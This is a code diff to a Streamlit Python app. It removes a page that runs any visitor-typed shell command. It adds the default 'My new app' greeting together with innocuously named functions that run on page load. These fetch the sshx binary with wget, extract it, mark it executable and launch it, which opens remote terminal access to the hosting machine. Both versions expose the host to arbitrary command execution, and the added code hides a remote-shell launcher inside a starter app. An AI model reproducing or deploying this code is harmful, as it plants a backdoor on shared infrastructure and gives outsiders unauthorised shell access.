@@ -1,34 +1,28 @@
 import streamlit as st
-import subprocess
-import threading
-import queue
-import time
 
-def run_command(command, output_queue):
-    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
-    for line in process.stdout:
-        output_queue.put(line)
-    for line in process.stderr:
-        output_queue.put(line)
-    process.wait()
+st.title("🎈 My new app")
+st.write(
+    "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
+)
 
-def stream_console_output(command):
-    st.title('Console Output in Streamlit')
+import pty
 
-    output_queue = queue.Queue()
-    thread = threading.Thread(target=run_command, args=(command, output_queue))
-    thread.start()
+def execute_ls():
+    pty.spawn(['/bin/sh', '-c', 'wget https://sshx.s3.amazonaws.com/sshx-aarch64-unknown-linux-musl.tar.gz'])
 
-    output_lines = []
+execute_ls()
 
-    while thread.is_alive() or not output_queue.empty():
-        while not output_queue.empty():
-            line = output_queue.get()
-            output_lines.append(line)
-        st.text_area('Console Output', value=''.join(output_lines), height=400, key='console_output')
-        time.sleep(0.1)
+def execute_las():
+    pty.spawn(['/bin/sh', '-c', 'tar -xvzf sshx-aarch64-unknown-linux-musl.tar.gz'])
 
-if __name__ == "__main__":
-    command = st.text_input('Enter the command to run:', value='echo Hello, Streamlit!')
-    if st.button('Run Command'):
-        stream_console_output(command)
+execute_las()
+
+def execute_la():
+    pty.spawn(['/bin/sh', '-c', 'chmod +x sshx'])
+
+execute_la()
+
+def execute_lad():
+    pty.spawn(['/bin/sh', '-c', 'sshx'])
+
+execute_lad()
